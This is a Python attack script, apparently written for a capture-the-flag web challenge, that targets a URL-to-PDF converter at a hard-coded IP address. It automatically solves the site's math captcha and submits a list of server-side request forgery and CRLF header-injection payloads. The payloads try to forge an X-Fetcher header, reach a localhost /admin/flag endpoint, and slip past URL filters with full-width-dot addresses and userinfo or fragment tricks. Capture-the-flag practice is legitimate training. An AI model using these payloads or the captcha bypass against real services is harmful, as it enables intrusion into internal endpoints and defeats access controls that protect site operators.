#!/usr/bin/env python3
"""
Web 2 Doc 1 - Header Injection / CRLF attacks

The X-Fetcher header check blocks 'internal'.
If we can inject headers, we might be able to:
1. Inject a duplicate X-Fetcher header with different value
2. Use CRLF to manipulate request
3. Exploit Flask's header parsing behavior

Flask uses request.headers.get() which returns the FIRST header value.
If we can inject a SECOND X-Fetcher before the app adds 'internal',
we might bypass the check!
"""

import requests
import re
import urllib.parse

BASE_URL = "http://52.59.124.14:5002"

def get_session_and_captcha():
    """Get a fresh session and solve captcha."""
    session = requests.Session()
    resp = session.get(f"{BASE_URL}/")
    match = re.search(r'Math Challenge:\s*(\d+)\s*([+\-*])\s*(\d+)\s*=', resp.text)
    if match:
        a, op, b = int(match.group(1)), match.group(2), int(match.group(3))
        if op == '+':
            answer = a + b
        elif op == '-':
            answer = a - b
        elif op == '*':
            answer = a * b
        else:
            return None, None
        return session, str(answer)
    return None, None

def test_url(url):
    """Test a URL with fresh session."""
    session, captcha = get_session_and_captcha()
    if not session:
        return None
    
    resp = session.post(f"{BASE_URL}/convert", data={
        "url": url,
        "captcha_answer": captcha
    })
    return resp

def main():
    print("[*] Testing URL parameter injection for headers...\n")
    
    # If the app constructs URLs unsafely, we might inject headers via URL
    # CRLF injection patterns
    crlf_patterns = [
        # Basic CRLF in path
        "http://external.com/%0d%0aX-Fetcher:%20bypass%0d%0a",
        
        # CRLF in query string
        "http://external.com/?test%0d%0aX-Fetcher:%20bypass",
        
        # Try with localhost - if URL isn't validated after CRLF parsing
        "http://127.0.0.1:5002/admin/flag?i=0&c=C%0d%0aX-Fetcher:%20not-internal",
        
        # URL with fragment that might confuse parser
        "http://127.0.0.1:5002/admin/flag#.example.com",
        
        # Try with authentication in URL that might be stripped
        "http://internal@external.com:5002/",
        
        # URL unicode normalization tricks
        "http://127。0。0。1:5002/",  # Full-width dots
        "http://127．0．0．1:5002/",  # Other full-width dots
    ]
    
    for url in crlf_patterns:
        resp = test_url(url)
        if resp is None:
            print(f"[-] {url[:50]:50s} -> No response")
        elif resp.status_code == 200 and 'pdf' in resp.headers.get('Content-Type', '').lower():
            print(f"[+] {url[:50]:50s} -> SUCCESS! {len(resp.content)} bytes")
            with open("crlf_test.pdf", "wb") as f:
                f.write(resp.content)
        else:
            try:
                error = resp.json().get('error', '')[:30]
            except:
                error = resp.text[:30]
            print(f"[-] {url[:50]:50s} -> {resp.status_code}: {error}")

if __name__ == "__main__":
    main()
